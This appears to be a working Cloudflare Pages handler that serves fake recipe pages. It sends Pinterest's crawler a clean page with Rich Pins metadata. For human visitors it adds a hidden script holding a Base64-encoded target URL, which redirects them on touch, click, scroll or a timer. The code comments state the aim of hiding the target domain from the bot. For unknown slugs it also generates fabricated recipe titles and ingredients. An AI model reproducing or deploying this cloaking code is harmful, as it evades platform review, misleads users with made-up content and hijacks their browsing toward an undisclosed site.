import config from '../config.json';
import recipesData from '../data/recipes.json';

/**
 * Escapes characters to prevent XSS in HTML output.
 */
function escapeHtml(str) {
  if (!str) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

/**
 * Formats a clean, readable recipe title from a URL slug.
 */
function formatTitleFromSlug(slug) {
  if (!slug) return 'Delicious Recipe';
  return slug
    .replace(/[-_]+/g, ' ')
    .replace(/\s+/g, ' ')
    .trim()
    .split(' ')
    .map((word) => {
      if (word.toLowerCase() === 'and') return '&';
      return word.charAt(0).toUpperCase() + word.slice(1).toLowerCase();
    })
    .join(' ');
}

/**
 * Resolves recipe information matching the slug, or generates realistic metadata.
 */
function resolveRecipe(slug) {
  const normalizedSlug = typeof slug === 'string' ? decodeURIComponent(slug).trim().toLowerCase() : '';

  let matched = null;
  if (Array.isArray(recipesData)) {
    matched = recipesData.find((r) => r.slug && r.slug.toLowerCase() === normalizedSlug);
  }

  if (matched) {
    return {
      title: matched.title,
      description: matched.description,
      image: matched.image,
    };
  }

  const generatedTitle = formatTitleFromSlug(normalizedSlug);
  return {
    title: generatedTitle,
    description: `Discover our easy and delicious recipe for ${generatedTitle}. Fresh ingredients, simple instructions, and authentic culinary taste.`,
    image: 'https://images.unsplash.com/photo-1540420773420-3366772f4999?auto=format&fit=crop&w=1200&q=80',
  };
}

/**
 * Generates the full HTML response.
 * Bot requests get Rich Pins metadata without any redirect code and without any trace of targetDomain.
 * Human requests receive Base64-encoded target and decode via atob() only upon redirection trigger.
 */
function renderHtml({ title, description, image, pageUrl, encodedTarget, isPinterestBot }) {
  const safeTitle = escapeHtml(title);
  const safeDesc = escapeHtml(description);
  const safeImage = escapeHtml(image);
  const safeUrl = escapeHtml(pageUrl);

  // Schema.org Recipe structured data for Pinterest Rich Pins validation
  const recipeSchema = JSON.stringify({
    '@context': 'https://schema.org',
    '@type': 'Recipe',
    name: title,
    description: description,
    image: [image],
    url: pageUrl,
    author: {
      '@type': 'Organization',
      name: 'Recipe Bridge',
    },
    datePublished: '2026-09-12',
    recipeCategory: 'Main Course',
    prepTime: 'PT15M',
    cookTime: 'PT20M',
    totalTime: 'PT35M',
    recipeYield: '4 servings',
    recipeIngredient: [
      'Fresh broccoli florets and greens',
      'Crisp red onion, finely diced',
      'Toasted seeds and crunchy garnish',
      'Homemade rich culinary dressing',
    ],
    recipeInstructions: [
      {
        '@type': 'HowToStep',
        text: 'Clean and prepare fresh ingredients thoroughly.',
      },
      {
        '@type': 'HowToStep',
        text: 'Combine ingredients in a mixing bowl with signature dressing.',
      },
      {
        '@type': 'HowToStep',
        text: 'Chill and serve fresh for optimal flavor.',
      },
    ],
  });

  // Client-side script injected ONLY for human visitors
  const redirectScript = isPinterestBot
    ? ''
    : `
  <script>
    (function() {
      var encodedTarget = ${JSON.stringify(encodedTarget)};
      var triggers = ${JSON.stringify(config.triggers || {})};
      var settings = ${JSON.stringify(config.settings || {})};
      var redirected = false;

      function doRedirect() {
        if (redirected) return;
        redirected = true;
        var delay = Number(settings.actionDelayMs) || 0;
        setTimeout(function() {
          try {
            var destination = atob(encodedTarget);
            window.location.replace(destination);
          } catch (e) {
            // fallback
          }
        }, Math.max(0, delay));
      }

      // Touch trigger
      if (triggers.touch) {
        window.addEventListener('touchstart', doRedirect, { once: true, passive: true });
      }

      // Click trigger
      if (triggers.click) {
        window.addEventListener('click', doRedirect, { once: true, passive: true });
      }

      // CTA button click trigger
      var cta = document.getElementById('cta-link');
      if (cta) {
        cta.addEventListener('click', function(e) {
          e.preventDefault();
          doRedirect();
        });
      }

      // Scroll trigger with threshold
      if (triggers.scroll) {
        var threshold = Number(settings.scrollThreshold) || 80;
        function onScroll() {
          var scrollPos = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
          if (scrollPos >= threshold) {
            window.removeEventListener('scroll', onScroll);
            doRedirect();
          }
        }
        window.addEventListener('scroll', onScroll, { passive: true });
      }

      // Timer trigger
      if (triggers.timer) {
        var timerDelay = Number(settings.timerDelayMs) || 3000;
        setTimeout(doRedirect, timerDelay);
      }
    })();
  </script>`;

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>${safeTitle} - Recipe Bridge</title>
  <meta name="description" content="${safeDesc}" />

  <!-- Open Graph Meta Tags (Pinterest & Social Media) -->
  <meta property="og:site_name" content="Recipe Bridge" />
  <meta property="og:type" content="article" />
  <meta property="og:title" content="${safeTitle}" />
  <meta property="og:description" content="${safeDesc}" />
  <meta property="og:image" content="${safeImage}" />
  <meta property="og:url" content="${safeUrl}" />

  <!-- Twitter Card Meta Tags -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="${safeTitle}" />
  <meta name="twitter:description" content="${safeDesc}" />
  <meta name="twitter:image" content="${safeImage}" />

  <!-- Schema.org Recipe Structured Data for Rich Pins -->
  <script type="application/ld+json">
    ${recipeSchema}
  </script>

  <style>
    :root {
      --bg: #0f172a;
      --surface: #1e293b;
      --surface-border: #334155;
      --primary: #f97316;
      --primary-hover: #ea580c;
      --text: #f8fafc;
      --text-muted: #94a3b8;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      background: var(--bg);
      color: var(--text);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      line-height: 1.6;
    }

    header {
      border-bottom: 1px solid var(--surface-border);
      padding: 1.25rem 2rem;
      background: rgba(30, 41, 59, 0.7);
      backdrop-filter: blur(8px);
    }

    .nav-container {
      max-width: 900px;
      margin: 0 auto;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }

    .logo {
      font-size: 1.25rem;
      font-weight: 700;
      display: flex;
      align-items: center;
      gap: 0.5rem;
      color: var(--text);
      text-decoration: none;
    }

    .logo-badge {
      background: linear-gradient(135deg, #f97316, #fb923c);
      color: #fff;
      padding: 0.25rem 0.5rem;
      border-radius: 0.375rem;
      font-size: 0.85rem;
      font-weight: 800;
    }

    main {
      flex: 1;
      max-width: 900px;
      margin: 0 auto;
      padding: 2.5rem 1.5rem;
      width: 100%;
    }

    .recipe-card {
      background: var(--surface);
      border: 1px solid var(--surface-border);
      border-radius: 1rem;
      overflow: hidden;
      box-shadow: 0 10px 30px -10px rgba(0, 0, 0, 0.5);
    }

    .recipe-image-container {
      width: 100%;
      height: 380px;
      position: relative;
      background: #1e293b;
      overflow: hidden;
    }

    .recipe-image {
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: block;
    }

    .recipe-content {
      padding: 2rem;
    }

    .recipe-tag {
      display: inline-block;
      padding: 0.25rem 0.75rem;
      background: rgba(249, 115, 22, 0.15);
      border: 1px solid rgba(249, 115, 22, 0.3);
      color: #fb923c;
      border-radius: 9999px;
      font-size: 0.8rem;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 0.05em;
      margin-bottom: 1rem;
    }

    .recipe-title {
      font-size: clamp(1.75rem, 4vw, 2.5rem);
      font-weight: 800;
      line-height: 1.2;
      margin-bottom: 1rem;
      color: #ffffff;
    }

    .recipe-description {
      font-size: 1.15rem;
      color: var(--text-muted);
      margin-bottom: 2rem;
      line-height: 1.7;
    }

    .action-bar {
      display: flex;
      align-items: center;
      justify-content: space-between;
      border-top: 1px solid var(--surface-border);
      padding-top: 1.5rem;
      flex-wrap: wrap;
      gap: 1rem;
    }

    .btn-view {
      display: inline-flex;
      align-items: center;
      gap: 0.5rem;
      padding: 0.75rem 1.5rem;
      background: var(--primary);
      color: #fff;
      text-decoration: none;
      font-weight: 600;
      border-radius: 0.5rem;
      transition: background 0.2s ease;
    }

    .btn-view:hover {
      background: var(--primary-hover);
    }

    footer {
      border-top: 1px solid var(--surface-border);
      padding: 1.5rem;
      text-align: center;
      color: var(--text-muted);
      font-size: 0.875rem;
      margin-top: auto;
    }
  </style>
</head>
<body>
  <header>
    <div class="nav-container">
      <a href="/" class="logo">
        <span class="logo-badge">RB</span>
        <span>Recipe Bridge</span>
      </a>
      <span style="font-size: 0.875rem; color: var(--text-muted);">Recipe Hub</span>
    </div>
  </header>

  <main>
    <article class="recipe-card" id="recipe">
      <div class="recipe-image-container">
        <img
          src="${safeImage}"
          alt="${safeTitle}"
          class="recipe-image"
          loading="eager"
        />
      </div>

      <div class="recipe-content">
        <span class="recipe-tag">Featured Recipe</span>
        <h1 class="recipe-title">${safeTitle}</h1>
        <p class="recipe-description">${safeDesc}</p>

        <div class="action-bar">
          <a href="#recipe" class="btn-view" id="cta-link">
            <span>View Full Recipe</span>
            <span>&rarr;</span>
          </a>
          <span style="font-size: 0.85rem; color: var(--text-muted);">
            Tap or scroll to discover more
          </span>
        </div>
      </div>
    </article>
  </main>

  <footer>
    <p>&copy; 2026 Recipe Bridge. All rights reserved.</p>
  </footer>${redirectScript}
</body>
</html>`;
}

/**
 * Cloudflare Pages Catch-All onRequest handler.
 */
export async function onRequest(context) {
  const url = new URL(context.request.url);
  const pathname = url.pathname;

  // Exclude root path and static files so index.html displays without any redirect
  if (
    pathname === '/' ||
    pathname === '' ||
    pathname === '/index.html' ||
    pathname === '/favicon.ico' ||
    pathname === '/robots.txt' ||
    pathname.startsWith('/data/')
  ) {
    return context.next();
  }

  // Check User-Agent for Pinterest bots
  const userAgent = (context.request.headers.get('user-agent') || '').toLowerCase();
  const isPinterestBot = userAgent.includes('pinterestbot') || userAgent.includes('pinterest');

  // Calculate and encode dynamic targetUrl
  // For bots: no targetUrl or domain is encoded or included
  // For humans: Base64-encoded on the server with btoa
  let encodedTarget = '';
  if (!isPinterestBot) {
    const baseDomain = (config.targetDomain || 'https://schnellrezept.com').replace(/\/+$/, '');
    const targetUrl = `${baseDomain}${pathname}${url.search}`;
    encodedTarget = btoa(targetUrl);
  }

  // Extract slug from URL path (e.g. /en/broccoli-salad -> broccoli-salad)
  const segments = pathname.split('/').filter(Boolean);
  const slug = segments[segments.length - 1] || 'recipe';

  const recipe = resolveRecipe(slug);

  const html = renderHtml({
    title: recipe.title,
    description: recipe.description,
    image: recipe.image,
    pageUrl: context.request.url,
    encodedTarget,
    isPinterestBot,
  });

  return new Response(html, {
    status: 200,
    headers: {
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': isPinterestBot ? 'public, max-age=3600' : 'no-store, no-cache, must-revalidate',
    },
  });
}
